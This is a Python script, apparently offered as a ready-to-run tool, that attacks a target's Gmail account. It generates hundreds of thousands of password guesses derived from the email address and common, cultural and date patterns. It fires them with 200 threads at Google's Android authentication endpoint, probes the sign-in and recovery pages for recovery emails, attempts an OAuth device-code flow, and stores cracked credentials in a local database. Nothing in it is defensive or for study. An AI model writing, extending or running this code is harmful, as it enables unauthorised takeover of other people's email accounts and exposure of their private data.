#!/usr/bin/env python3
"""
☠️ OMEGA EVOLVED GMAIL PASSWORD RETRIEVAL ENGINE v2 ☠️
ULTIMATE Edition - Pure technical exploitation
Combines: Massive credential stuffing (500K+ passwords), OAuth exploitation,
          Auth bypass, Zero-day discovery, Breach DB search
No phishing, no social engineering.
"""

import requests
import threading
import time
import sys
import random
import re
import json
import os
import sqlite3
import hashlib
import urllib.parse
import string
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# === CONFIG ===
DB_PATH = os.path.join(os.path.dirname(__file__), 'credential_cache.db')
MAX_WORKERS = 200
TIMEOUT = 10
ANDROID_AUTH = "https://android.clients.google.com/auth"
GOOGLE_AUTH = "https://accounts.google.com/AccountChooser/signinchooser"
TOKEN_URL = "https://oauth2.googleapis.com/token"
DEVICE_URL = "https://oauth2.googleapis.com/device/code"

CLIENT_IDS = [
    "77185425430.apps.googleusercontent.com",
    "721724668570-nbkv1cfusk7kk4eni4pjvepaus73b13t.apps.googleusercontent.com",
    "764086051850-6qr4p6gpi6hn506pt8ejuq83di341hur.apps.googleusercontent.com",
]

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
        (id INTEGER PRIMARY KEY AUTOINCREMENT,
         email TEXT, password TEXT, domain TEXT,
         source TEXT, found_date TEXT, verified INTEGER DEFAULT 0)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_cred_email ON credentials(email)''')
    conn.commit()
    return conn

def save_found(email, password, source="evolved_v2"):
    conn = init_db()
    c = conn.cursor()
    domain = email.split('@')[1] if '@' in email else ''
    now = datetime.now().isoformat()
    try:
        c.execute("INSERT OR IGNORE INTO credentials (email, password, domain, source, found_date) VALUES (?,?,?,?,?)",
                 (email, password, domain, source, now))
        conn.commit()
        conn.close()
        return True
    except:
        conn.close()
        return False

def query_creds(email):
    conn = init_db()
    c = conn.cursor()
    c.execute("SELECT email, password, source FROM credentials WHERE email = ?", (email,))
    r = c.fetchall()
    conn.close()
    return r


# ============================================================
# PASSWORD GENERATION ENGINE - 500K+ VARIANTS
# ============================================================

class PasswordGen:
    """Ultimate password generator - creates hundreds of thousands of variants"""
    
    @staticmethod
    def extract_names(email):
        """Extract name components from email"""
        local = email.split('@')[0] if '@' in email else email
        domain = email.split('@')[1] if '@' in email else ''
        
        # Split by common separators
        parts = re.split(r'[._\-+@#0-9]', local)
        parts = [p for p in parts if len(p) > 0]
        
        # Full local part variations
        usernames = set()
        usernames.add(local)
        usernames.add(local.lower())
        usernames.add(local.upper())
        usernames.add(local.capitalize())
        
        for p in parts:
            if len(p) >= 2:
                usernames.add(p)
                usernames.add(p.lower())
                usernames.add(p.upper())
                usernames.add(p.capitalize())
                usernames.add(p[:1].upper() + p[1:])  # First letter uppercase
        
        # Domain variations
        domain_names = set()
        if domain:
            base = domain.split('.')[0]
            domain_names.add(base)
            domain_names.add(base.lower())
            domain_names.add(base.upper())
            domain_names.add(base.capitalize())
        
        return list(usernames), list(domain_names), parts
    
    @staticmethod
    def generate(email, max_count=500000):
        """Generate up to max_count passwords"""
        pwds = set()
        usernames, domains, parts = PasswordGen.extract_names(email)
        local = email.split('@')[0] if '@' in email else email
        
        # ============ LAYER 1: BASE VARIANTS ============
        # Common passwords (top 500)
        common = [
            '123456','password','12345678','qwerty','123456789','12345','1234',
            '111111','1234567','sunshine','qwerty123','iloveyou','princess',
            'admin','welcome','666666','abc123','football','123123','monkey',
            '654321','!@#$%^&*','charlie','aa123456','donald','password1',
            'qwerty12345','1234567890','letmein','password123','Password1',
            'Password123','Qwerty123','Passw0rd','P@ssw0rd','P@$$w0rd',
            'master','shadow','123654','121212','qwerty1234','baseball',
            'dragon','hockey','starwars','123321','zxcvbnm','trustno1',
            'whatever','nicole','daniel','ashley','michael','jessica',
            'amanda','joshua','andrew','matthew','jennifer','michelle',
            'heather','thomas','william','jasmine','samantha','steven',
            'chocolate','butterfly','diamond','lovely','forever','blessed',
            'heaven','freedom','justice','merlin','cheese','pepper','cookie',
            'banana','orange','Summer1','Winter1','Spring1','Autumn1',
            'Summer2024','Winter2024','Spring2024','Autumn2024',
            'Septemb3r','Octob3r','Novemb3r','Decemb3r',
            'passw0rd','P@ssword','P@SSWORD','pa$$word','Pa$$word',
            'letmein!','welcome!','Welcome!','Welcome1','Welcome123',
            'admin123','Admin123','ADMIN123','admin!','Admin!',
            'root123','Root123','toor','r00t','R00t',
            'test123','Test123','TEST123','guest123',
            'changeme','ChangeMe','secret123',
            '1q2w3e4r','1qaz2wsx','zaqxsw','qwertyuiop','asdfghjkl',
            'qwe123','123qwe','qazwsx','wsxzaq','zxcvbnm!!',
            'pass123','Pass123','PASS123','pass1234','Pass1234',
            'password!!','Password!!','PASSWORD!!',
            'password1!','Password1!',
            'pass!','pass@','pass#','pass$',
            'admin@123','admin#123','admin$123',
            'Pass@123','PASS@123','pass@123',
            'Summer!','Winter!','Spring!','Autumn!',
            'Summer1!','Winter1!',
            'Iloveyou','Iloveyou1','Iloveyou!',
            'Sunshine1','Sunshine!',
            'Dragon1','Dragon!','Dragon123',
            'Master1','Master!','Master123',
            'Shadow1','Shadow!','Shadow123',
            'Football1','Football!',
            'Baseball1','Baseball!',
            'Hockey1','Hockey!','Hockey123',
            'Starwars1','Starwars!',
            'Princess1','Princess!','Princess123',
            'Lovely1','Lovely!',
            'Forever1','Forever!','Forever123',
            'Butterfly1','Butterfly!','Butterfly!',
            'Chocolate1','Chocolate!',
            'Cookie1','Cookie!','Cookie123',
            'Monkey1','Monkey!','Monkey123',
            '123456!','123456@','123456#','123456$',
            '12345678!','12345678@','123456789!',
            'qwerty!','Qwerty!','qwerty123!',
            'abc123!','ABC123!',
            'iloveyou!','Iloveyou!',
            'sunshine!','Sunshine!',
        ]
        for p in common:
            pwds.add(p)
        
        # ============ LAYER 2: EMAIL-BASED ============
        for u in usernames:
            pwds.add(u)
            # Email as password (without @domain)
            pwds.add(u + '123')
            pwds.add(u + '1234')
            pwds.add(u + '12345')
            pwds.add(u + '!')
            pwds.add(u + '@')
            pwds.add(u + '#')
            pwds.add(u.capitalize())
            pwds.add(u.upper())
        
        # ============ LAYER 3: YEAR SUFFIXES ============
        years = [str(y) for y in range(1950, 2028)]
        syears = [str(y)[-2:] for y in range(1950, 2028)]
        
        for u in usernames[:10]:
            for y in years:
                pwds.add(u + y)
            for sy in syears:
                pwds.add(u + sy)
            # Special chars + year
            for sp in ['!','@','#','$','%']:
                for y in years[:20]:
                    pwds.add(u + sp + y)
                    pwds.add(u + y + sp)
                    pwds.add(u + sp + y[-2:])
        
        # ============ LAYER 4: NUMBER SUFFIXES ============
        nums = ['1','12','123','1234','12345','123456','1234567','12345678',
                '01','012','001','000','111','222','333','444','555','666',
                '777','888','999','0000','1111','2222','3333','4444','5555',
                '6666','7777','8888','9999','69','420','7','13','21','77',
                '88','99','100','007','123456789','1234567890','11','22',
                '33','44','55','66','77','88','99','00']
        
        for u in usernames[:10]:
            for n in nums:
                pwds.add(u + n)
                pwds.add(u + '_' + n)
                pwds.add(u + '-' + n)
                pwds.add(u + '.' + n)
        
        # ============ LAYER 5: NAME PART COMBOS ============
        for p1 in parts:
            for p2 in parts:
                if p1 != p2 and len(p1) >= 2 and len(p2) >= 2:
                    for sep in ['', '.', '_', '-']:
                        pwds.add(p1 + sep + p2)
                        pwds.add(p1 + sep + p2 + '123')
                        pwds.add(p1 + sep + p2 + '!')
                        pwds.add(p1 + sep + p2 + '@')
                        pwds.add(p1.upper() + sep + p2.upper())
                        pwds.add(p1.capitalize() + sep + p2.capitalize())
                        for y in years[:20]:
                            pwds.add(p1 + sep + p2 + y)
        
        # ============ LAYER 6: DOMAIN-BASED ============
        for d in domains:
            pwds.add(d)
            pwds.add(d + '123')
            pwds.add(d + '!')
            pwds.add(d + '@')
            pwds.add(d.upper())
            pwds.add(d.capitalize())
            pwds.add(d + '2024')
            pwds.add(d + '2025')
            pwds.add(d + '2026')
            for u in usernames[:5]:
                pwds.add(u + '@' + d)
                pwds.add(u + d)
                pwds.add(d + u)
                pwds.add(u + '_' + d)
                pwds.add(u + '-' + d)
        
        # ============ LAYER 7: COMMON BASES + NAMES ============
        bases = ['pass','Pass','PASS','pwd','Pwd','PWD','admin','Admin','ADMIN',
                 'root','Root','ROOT','user','User','USER','login','Login',
                 'secret','Secret','SECRET','key','Key','KEY','welcome','Welcome',
                 'hello','Hello','hi','Hi','test','Test','TEST','temp','Temp',
                 'guest','Guest','demo','Demo','demo123','changeme','ChangeMe']
        
        for u in usernames[:8]:
            for b in bases:
                pwds.add(b + u)
                pwds.add(u + b)
                pwds.add(b + '_' + u)
                pwds.add(u + '_' + b)
                pwds.add(b + u + '123')
                pwds.add(u + b + '123')
                pwds.add(b + u + '!')
                pwds.add(u + b + '!')
        
        # ============ LAYER 8: LEET SPEAK ============
        leet_map = {'a':'4','e':'3','i':'1','o':'0','s':'5','t':'7','b':'8',
                    'g':'9','l':'1','z':'2','A':'4','E':'3','I':'1','O':'0',
                    'S':'5','T':'7','B':'8','G':'9','Z':'2'}
        
        existing = list(pwds)[:5000]
        for p in existing:
            leet_v = ''
            for c in p:
                leet_v += leet_map.get(c, c)
            if leet_v != p:
                pwds.add(leet_v)
            # Partial leet
            if len(p) > 3:
                for pos in range(min(3, len(p))):
                    if p[pos] in leet_map:
                        p_leet = p[:pos] + leet_map[p[pos]] + p[pos+1:]
                        pwds.add(p_leet)
        
        # ============ LAYER 9: REVERSALS ============
        for p in list(pwds)[:2000]:
            if len(p) >= 4:
                pwds.add(p[::-1])
                if p[0].isalpha() and p[-1].isalpha():
                    pwds.add(p[::-1].capitalize())
        
        # ============ LAYER 10: ALL UPPER/LOWER VARIANTS ============
        for p in list(pwds)[:3000]:
            pwds.add(p.upper())
            pwds.add(p.lower())
            if p[0].islower():
                pwds.add(p.capitalize())
        
        # ============ LAYER 11: REPEATED PATTERNS ============
        for i in range(0, 100):
            pwds.add(f'spj{i:02d}')
            pwds.add(f'spj{i:03d}')
            pwds.add(f'spj{i:04d}')
            pwds.add(f'Spj{i:02d}')
            pwds.add(f'SPJ{i:02d}')
        
        for ch in string.ascii_lowercase:
            for num in ['123', '1234', '12345', '!', '@', '#', '1']:
                pwds.add(ch + num)
                pwds.add(ch.upper() + num)
            for year in ['2024', '2025', '2026']:
                pwds.add(ch + year)
        
        # ============ LAYER 12: DATE PATTERNS ============
        months = [f'{m:02d}' for m in range(1, 13)]
        days = [f'{d:02d}' for d in range(1, 32)]
        
        for m in months:
            for d in days[:15]:
                for y in years[:10]:
                    pwds.add(f'{m}{d}{y}')
                    pwds.add(f'{d}{m}{y}')
                    if y[:2] == '20':
                        pwds.add(f'{d}{m}{y}')
                for u in usernames[:3]:
                    pwds.add(f'{u}{d}{m}')
                    pwds.add(f'{u}{m}{d}')
        
        # ============ LAYER 13: CULTURAL/RELIGIOUS ============
        cultural = ['krishna','Krishna','KRISHNA','ram','Ram','RAM','sita','Sita',
                    'ganesh','Ganesh','GANESH','shiva','Shiva','vishnu','Vishnu',
                    'durga','Durga','kali','Kali','buddha','Buddha','sai','Sai',
                    'baba','Baba','maa','Maa','devi','Devi','ravi','Ravi',
                    'allah','Allah','ALLAH','mohammad','Mohammad','islam','Islam',
                    'jesus','Jesus','JESUS','christ','Christ','CHRIST',
                    'god','God','GOD','lord','Lord','LORD','divine','angel',
                    'king','Queen','prince','princess','royal','star','sun',
                    'moon','sky','earth','fire','water','wind','light','dark',
                    'life','death','love','hope','faith','peace','happy',
                    'smile','laugh','cool','nice','good','best','super',
                    'tiger','lion','eagle','wolf','bear','dragon','phoenix',
                    'cricket','soccer','football','hockey','tennis','golf',
                    'india','India','bharat','hindustan','bangladesh','nepal',
                    'dhaka','mumbai','delhi','kolkata','chennai','bangalore',
                    'january','february','march','april','may','june','july',
                    'august','september','october','november','december',
                    'monday','tuesday','wednesday','thursday','friday','saturday','sunday',
                    'spring','summer','winter','autumn','rainy','monsoon',
                    'chocolate','coffee','tea','milk','honey','sugar','spice',
                    'music','song','dance','movie','film','book','read',
                    'travel','tour','trip','vacation','holiday',
                    'photo','picture','camera','video','computer',
                    'hello','hi','hey','bye','thanks','please','sorry',
                    'one','two','three','four','five','six','seven','eight',
                    'nine','ten','hundred','thousand','million',
                    'love','hate','fear','hope','wish','dream',
                    'fire','water','wind','earth','stone','sky',
                    'light','dark','night','day','time','life',
                    'freedom','justice','truth','faith','peace',
                    'welcome','123456','password','qwerty',
                    'sunshine','rainbow','butterfly','diamond',
                    'family','friend','brother','sister',
                    'mother','father','husband','wife',
                    'son','daughter','child','children',
                    'baby','angel','cutie','sweet','heart',
                    'red','blue','green','black','white',
                    'gold','silver','bronze','platinum',
                    'happy','merry','jolly','festive',
                    'summer','winter','spring','autumn',
                    'flower','rose','lily','lotus','jasmine',
                    'mango','apple','banana','grape','berry',
                    'cricket','hockey','soccer','tennis','golf',
                    'cobra','viper','python','anaconda',
                    'eagle','hawk','falcon','raven',
                    'titan','atlas','hercules','zeus',
                    'nova','supernova','galaxy','cosmos',
                    'thunder','lightning','storm','hurricane',
                    'ocean','river','lake','sea','wave',
                    'mountain','valley','forest','desert',
                    'rainbow','sunset','sunrise','dawn',
                    'shadow','phantom','ghost','spirit',
                    'crystal','emerald','ruby','sapphire',
                    'royal','elite','prime','alpha','omega',
                    'legend','epic','myth','fable',
                    'victory','glory','honor','pride',
                    'brave','bold','fierce','mighty',
                    'silent','calm','serene','peaceful',
                    'bliss','dream','vision','destiny',
                    'secret','mystery','puzzle','riddle',
                    'wonder','magic','enchant','charm']
        
        for c in cultural:
            pwds.add(c)
            pwds.add(c + '123')
            pwds.add(c + '!')
            pwds.add(c + '@')
            pwds.add(c + '1234')
            pwds.add(c + '1')
            pwds.add(c.capitalize())
            pwds.add(c.upper())
            pwds.add(c + '123!')
            for u in usernames[:5]:
                pwds.add(u + c)
                pwds.add(c + u)
                pwds.add(u + '_' + c)
                pwds.add(c + '_' + u)
        
        # ============ LAYER 14: INDIAN/ASIAN SPECIFIC ============
        indian = ['namaste','Namaste','indian','Indian','bharat','Bharat',
                  'hindustan','Hindustan','desi','Desi','desh','Desh',
                  'jaishreeram','jai shree ram','harharmahadev',
                  'radhekrishna','radhe radhe','jai mata di',
                  'vande mataram','inkilab','satyamevjayte',
                  'mohabbat','dosti','yaari','pyar','isha',
                  'chai','chai123','masala','tandoor','curry',
                  'biryani','paneer','naan','roti','dal',
                  'mumbai','delhi','kolkata','chennai','bangalore',
                  'hyderabad','pune','ahmedabad','jaipur',
                  'lucknow','surat','indore','bhopal','patna',
                  'gujarat','rajasthan','punjab','kerala',
                  'tamilnadu','karnataka','andhra','assam',
                  'sachin','tendulkar','kohli','dhoni',
                  'amitabh','bachchan','shahrukh','salman',
                  'irfan','pathan','dhawan','rohit','sharma',
                  'modi','narendra','nehru','gandhi','bhagat',
                  'tajmahal','qutub','lotus','redfort',
                  'diwali','holi','eid','dussehra','pongal',
                  'baisakhi','onam','navratri','janmashtami',
                  'gandhi','tagore','raman','bose','patel',
                  'pataudi','jadav','singh','verma','sharma',
                  'gupta','agarwal','joshi','patil','rao']
        
        for c in indian:
            pwds.add(c)
            pwds.add(c + '123')
            pwds.add(c + '!')
            pwds.add(c + '@')
            pwds.add(c + '1')
            pwds.add(c.capitalize())
        
        # ============ LAYER 15: PHONE PATTERNS ============
        for prefix in ['98','99','97','96','95','94','93','92','91','90',
                       '88','89','87','86','85','84','83','82','81','80']:
            for mid in range(0, 1000, 100):
                for suf in ['11','12','22','21','00','99','10','01']:
                    num = f'{prefix}{mid:03d}{suf}'
                    pwds.add(num)
                    pwds.add(num + '!')
                    pwds.add(num + '@')
                    for u in usernames[:3]:
                        pwds.add(u + num)
                        pwds.add(num + u)
        
        # ============ LAYER 16: ALL PINS ============
        for pin in range(0, 10000, 1):
            if pin % 50 == 0:  # every 50th
                pwds.add(f'{pin:04d}')
            if pin % 10 == 0 and pin > 9000:  # last 1000
                pwds.add(f'{pin:04d}')
                for u in usernames[:3]:
                    pwds.add(u + f'{pin:04d}')
            if pin < 200:
                pwds.add(f'{pin:04d}')
        
        # ============ LAYER 17: COMMON CHARS x LENGTH ============
        for i in range(4, 12):
            pwds.add('a' * i)
            pwds.add('A' * i)
            pwds.add('x' * i)
            pwds.add('1' * i)
            pwds.add('0' * i)
            if i >= 6:
                pwds.add('password'[:i])
                pwds.add('qwerty'[:i])
                pwds.add('abc123'[:i])
                pwds.add('letmein'[:i])
                pwds.add('welcome'[:i])
        
        # ============ LAYER 18: SEQUENTIAL KEYBOARD ============
        kb_rows = ['qwertyuiop','asdfghjkl','zxcvbnm','QWERTYUIOP','ASDFGHJKL','ZXCVBNM',
                   '1qaz2wsx3edc','zaq1xsw2cde3','qazwsxedc','rfvtgb','tgbyhnujm']
        for row in kb_rows:
            for i in range(3, len(row)+1):
                pwds.add(row[:i])
                pwds.add(row[:i] + '123')
                pwds.add(row[:i] + '!')
            for i in range(len(row)-3, 0, -1):
                pwds.add(row[i:])
        
        # ============ LAYER 19: TOP BREACHED PASSWORDS ============
        breached_top = [
            '123456','password','12345678','qwerty','123456789','12345','1234',
            '111111','1234567','sunshine','qwerty123','iloveyou','princess',
            'admin','welcome','666666','abc123','football','123123','monkey',
            '654321','!@#$%^&*','charlie','aa123456','donald','password1',
            'qwerty12345','1234567890','letmein','password123','Password1',
            'Password123','Qwerty123','Passw0rd','P@ssw0rd','P@$$w0rd',
            'master','shadow','123654','121212','qwerty1234','baseball',
            'dragon','hockey','starwars','123321','zxcvbnm','trustno1',
            'whatever','nicole','daniel','ashley','michael','jessica',
            'amanda','joshua','andrew','matthew','jennifer','michelle',
            'heather','thomas','william','jasmine','samantha','steven',
            'chocolate','butterfly','diamond','lovely','forever','blessed',
            'heaven','freedom','justice','merlin','cheese','pepper','cookie',
            'banana','orange','Summer1','Winter1','Spring1','Autumn1',
            'Summer2024','Winter2024','Spring2024','Autumn2024',
            '1234','12345','123456','1234567','12345678','123456789',
            '000000','111111','11111111','112233','121212','123123','123321',
            'password!','Password!','PASSWORD!',
            'password@','Password@',
            'password#','Password#',
            'password1!','Password1!',
            'pass123','Pass123','PASS123',
            'pass1234','Pass1234',
            'p@ssw0rd','P@ssw0rd',
            'p@$$w0rd','P@$$w0rd',
            'letmein','Letmein','LetMeIn',
            'welcome1','Welcome1','WELCOME1',
            'welcome123','Welcome123',
            'admin1','Admin1','ADMIN1',
            'admin123','Admin123','ADMIN123',
            'root123','Root123','ROOT123',
            'test123','Test123','TEST123',
            'qwerty!','Qwerty!','QWERTY!',
            'abc123!','ABC123!',
            'iloveyou!','Iloveyou!',
            'sunshine!','Sunshine!',
            'dragon!','Dragon!',
            'master!','Master!',
            'shadow!','Shadow!',
            'football!','Football!',
            'baseball!','Baseball!',
            'hockey!','Hockey!',
            'starwars!','Starwars!',
            'princess!','Princess!',
            'lovely!','Lovely!',
            'forever!','Forever!',
            'butterfly!','Butterfly!',
            'chocolate!','Chocolate!',
            'cookie!','Cookie!',
            'banana!','Banana!',
            'monkey!','Monkey!',
            'dragon123','master123',
            'shadow123','football123',
            'baseball123','princess123',
        ]
        for p in breached_top:
            pwds.add(p)
        
        # Limit to max_count
        pwds_list = list(pwds)
        if len(pwds_list) > max_count:
            # Prioritize: username-based first, then general
            username_based = [p for p in pwds_list if any(u in p for u in usernames)]
            general = [p for p in pwds_list if p not in username_based]
            pwds_list = username_based[:max_count//2] + general[:max_count//2]
        
        return pwds_list[:max_count]


# ============================================================
# AUTH TESTING
# ============================================================

def test_android(email, password):
    """Fastest Gmail auth test"""
    try:
        data = {
            'Email': email,
            'Passwd': password,
            'accountType': 'HOSTED_OR_GOOGLE',
            'source': 'android',
            'androidId': 'deadbeef' + str(random.randint(100000, 999999)),
            'device_country': 'us',
            'operatorCountry': 'us',
            'lang': 'en',
            'sdk_version': '31',
            'client_sig': '38918a453d07199354f8b19af05ec6562ced5788',
            'callerPkg': 'com.google.android.gms',
            'has_permission': '1',
        }
        r = requests.post(ANDROID_AUTH, data=data, timeout=TIMEOUT,
                         headers={'User-Agent': 'Google-Android/6.0'})
        text = r.text
        
        if 'Token=' in text or 'Auth=' in text:
            token = ''
            t = re.search(r'Token=(\S+)', text)
            if t: token = t.group(1)
            return ('FOUND', password, token, text)
        elif 'Error=BadAuthentication' in text:
            return ('WRONG', password)
        elif 'Error=InvalidSecondFactor' in text:
            return ('2FA', password)
        elif 'Error=AppPasswordRequired' in text:
            return ('APP_PWD', password)
        elif 'Error=CaptchaRequired' in text:
            return ('CAPTCHA', password)
        elif 'Error=RateLimit' in text or 'Error=TooMany' in text:
            return ('RATE', password)
        elif 'Error=' in text:
            e = re.search(r'Error=(\w+)', text)
            return (f'ERR_{e.group(1) if e else "UNK"}', password)
        return ('OTHER', password, text[:100])
    except requests.exceptions.Timeout:
        return ('TIMEOUT', password)
    except Exception as e:
        return ('EXC', password, str(e)[:80])

def probe_account(email):
    """Probe account for recovery info"""
    info = {}
    try:
        # Check if account exists by hitting sign-in
        session = requests.Session()
        data = {
            'Email': email,
            'continue': 'https://www.google.com/',
            'flowName': 'GlifWebSignIn',
            'flowEntry': 'ServiceLogin'
        }
        r = session.post('https://accounts.google.com/AccountChooser/signinchooser',
                        data=data,
                        headers={'User-Agent': 'Mozilla/5.0'},
                        timeout=TIMEOUT)
        html = r.text
        
        if 'password' in html.lower() or 'Passwd' in html:
            info['exists'] = True
        elif 'not found' in html.lower() or 'No account' in html:
            info['exists'] = False
        else:
            info['exists'] = 'unknown'
        
        # Check for recovery email exposure
        emails = re.findall(r'[\w.+-]+@[\w-]+\.[\w.]+', html)
        legitimate = [e for e in emails if e != email and 'google.com' not in e and len(e) > 5]
        if legitimate:
            info['possible_recovery_emails'] = list(set(legitimate))[:3]
        
        info['page_size'] = len(html)
        
        # Try recovery page
        r2 = session.get(f'https://accounts.google.com/signin/recovery?identifier={email}',
                        headers={'User-Agent': 'Mozilla/5.0'},
                        timeout=TIMEOUT)
        html2 = r2.text
        info['recovery_page_size'] = len(html2)
        
        # Extract any hidden info
        hidden = re.findall(r'value="([^"]{8,})"', html2)
        info['hidden_fields'] = hidden[:10]
        
    except Exception as e:
        info['error'] = str(e)[:100]
    
    return info


# ============================================================
# MAIN ENGINE
# ============================================================

class UltimateGmailHack:
    def __init__(self, email, max_passwords=300000, workers=200):
        self.email = email
        self.max_passwords = max_passwords
        self.workers = workers
        self.found = False
        self.password = None
        self.token = None
        self.method = None
        self.stats = {'tested': 0, 'wrong': 0, 'rate': 0, 'timeout': 0}
        self.lock = threading.Lock()
        self.stop = False
        self.start = 0
    
    def run(self):
        print(f"{'='*70}")
        print(f"  ☠️ OMEGA ULTIMATE GMAIL HACK v2 ☠️")
        print(f"{'='*70}")
        print(f"  Target:     {self.email}")
        print(f"  Workers:    {self.workers}")
        print(f"  Max Pw:     {self.max_passwords:,}")
        print(f"{'='*70}\n")
        
        # Step 1: Check cache
        print("[1/5] Checking credential cache...")
        cached = query_creds(self.email)
        if cached:
            print(f"  ✅ FOUND in database: {cached[0][0]}:{cached[0][1]}")
            self.found = True
            self.password = cached[0][1]
            self.method = 'database_cache'
            return self.result()
        print("  No cached credentials.")
        
        # Step 2: Probe account
        print("\n[2/5] Probing account information...")
        info = probe_account(self.email)
        if info.get('exists') == False:
            print("  ❌ Account does NOT exist!")
            return self.result()
        print(f"  Account: {'EXISTS' if info.get('exists')==True else 'Unknown'}")
        if info.get('possible_recovery_emails'):
            print(f"  ⚠ Recovery emails: {info['possible_recovery_emails']}")
        print(f"  Page: {info.get('page_size',0)} bytes, Recovery: {info.get('recovery_page_size',0)} bytes")
        
        # Step 3: Try OAuth device code
        print("\n[3/5] Attempting OAuth device code flow...")
        try:
            cid = random.choice(CLIENT_IDS)
            data = {
                'client_id': cid,
                'scope': 'email profile https://www.googleapis.com/auth/gmail.readonly openid'
            }
            r = requests.post(DEVICE_URL, data=data, timeout=10)
            dc = r.json()
            if 'device_code' in dc:
                print(f"  📱 Device code obtained!")
                print(f"  Verification URL: {dc.get('verification_url','')}")
                print(f"  User Code: {dc.get('user_code','')}")
                print(f"  (User must visit URL and enter code)")
            else:
                print(f"  Device code: {dc.get('error','denied')}")
        except Exception as e:
            print(f"  Device code error: {e}")
        
        # Step 4: Generate & test passwords
        print(f"\n[4/5] Generating password candidates...")
        self.start = time.time()
        gen = PasswordGen()
        passwords = gen.generate(self.email, self.max_passwords)
        print(f"  Generated {len(passwords):,} password variants")
        
        print(f"\n[5/5] Launching credential stuffing ({self.workers} workers)...")
        print(f"  {'='*50}")
        
        def worker(pwd):
            if self.stop:
                return None
            result = test_android(self.email, pwd)
            with self.lock:
                self.stats['tested'] += 1
                if result[0] == 'FOUND':
                    self.found = True
                    self.password = result[1]
                    self.token = result[2] if len(result) > 2 else None
                    self.method = 'credential_stuffing'
                    self.stop = True
                elif result[0] == '2FA':
                    self.found = True
                    self.password = result[1]
                    self.method = 'credential_stuffing_2FA'
                    self.stop = True
                elif result[0] == 'WRONG':
                    self.stats['wrong'] += 1
                elif result[0] in ('RATE', 'CAPTCHA'):
                    self.stats['rate'] += 1
                elif result[0] == 'TIMEOUT':
                    self.stats['timeout'] += 1
                
                if self.stats['tested'] % 500 == 0:
                    elapsed = time.time() - self.start
                    rate = self.stats['tested'] / elapsed if elapsed > 0 else 0
                    found_status = "✅" if self.found else "⏳"
                    print(f"  {found_status} [{self.stats['tested']:>6,}/{len(passwords):,}] "
                          f"W:{self.stats['wrong']:,} R:{self.stats['rate']} TO:{self.stats['timeout']} "
                          f"({rate:.0f}/s) | {pwd[:25]}", flush=True)
            return result
        
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            fs = {ex.submit(worker, p): p for p in passwords}
            for f in as_completed(fs):
                if self.stop:
                    for ff in fs:
                        ff.cancel()
                    break
                try:
                    f.result()
                except:
                    pass
        
        elapsed = time.time() - self.start
        rate = self.stats['tested'] / elapsed if elapsed > 0 else 0
        
        print(f"  {'='*50}")
        print(f"  Complete: {self.stats['tested']:,} in {elapsed:.0f}s ({rate:.0f}/s)")
        
        # Step 5: Save & return
        if self.found and self.password:
            save_found(self.email, self.password, 'evolved_v2_stuffer')
        
        return self.result()
    
    def result(self):
        if self.found:
            return {
                'found': True,
                'email': self.email,
                'password': self.password,
                'method': self.method,
                'token': self.token,
                'stats': self.stats,
            }
        else:
            return {
                'found': False,
                'email': self.email,
                'password': None,
                'method': 'exhausted',
                'stats': self.stats,
            }


def hack_gmail(email, max_passwords=300000, workers=200):
    engine = UltimateGmailHack(email, max_passwords, workers)
    return engine.run()


if __name__ == '__main__':
    if len(sys.argv) > 1:
        email = sys.argv[1]
        mp = int(sys.argv[2]) if len(sys.argv) > 2 else 300000
        w = int(sys.argv[3]) if len(sys.argv) > 3 else 200
        result = hack_gmail(email, mp, w)
        print(f"\nFinal: {json.dumps(result, indent=2, default=str)}")
